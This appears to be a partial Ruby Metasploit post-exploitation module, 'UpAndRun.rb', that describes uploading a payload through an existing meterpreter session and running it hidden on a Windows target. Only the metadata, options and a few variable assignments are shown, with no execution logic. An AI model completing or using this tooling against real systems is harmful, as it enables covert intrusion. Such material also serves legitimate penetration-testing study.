  class MetasploitModule < Msf::Post
        Rank = NormalRanking



# ------------------------------------
# Building Metasploit/Armitage info/GUI
# ------------------------------------
	def initialize(info={})
		super(update_info(info,
			'Name'          => '[ UpAndRun.rb - upload a script or executable and run it ]',
			'Description'   => %q{
					this module needs will upload a payload onto target system,
                                        using an existence meterpreter open session (post-exploitation)
                                        and then run it in a hidden chanalized windows.
			},
			'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
				[
					'peterubuntu10[at]sourceforge[dot]net',
				],

			'Version'       => '$Revision: 1.1',
                        'releasedDate'  => 'ago 4 2016',
			'Platform'      => 'windows',
			'Arch'          => 'x86_x64',
			'References'    =>
				[
					[ 'URL', 'http://sourceforge.net/users/peterubuntu10' ],
					[ 'URL', 'http://sourceforge.net/projects/myauxiliarymete/?source=navbar' ],
					[ 'URL', 'http://www.offensive-security.com/metasploit-unleashed/Building_A_Module' ],
					[ 'URL', 'http://oldmanlab.blogspot.pt/p/meterpreter-api-cheat-sheet.html' ],
					[ 'URL', 'http://www.rubydoc.info/github/rapid7/metasploit-framework/index' ],
					[ 'URL', 'https://github.com/rapid7/metasploit-framework/tree/master/modules/post' ],
					[ 'URL', 'https://www.facebook.com/Backtrack.Kali' ],
					[ 'URL', 'http://www.r00tsect0r.net' ]
				],
			'DefaultOptions' =>
				{
					'SESSION' => '1', # Default its to run againts session 1
				},
			'SessionTypes'  => [ 'shell', 'meterpreter' ]

		))

		register_options(
			[
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('upload', [ false, 'Executable or script to upload to target host.']),
                                OptString.new('path', [ false, 'Path on target to upload executable, default is %SYSTEM32%.'])
			], self.class)

	end




# -------------------------------------------
# variable declaration - metasploit API calls
# -------------------------------------------
session = client
trgloc = datastore['path']
file = datastore['upload']
sysnfo = session.sys.config.sysinfo

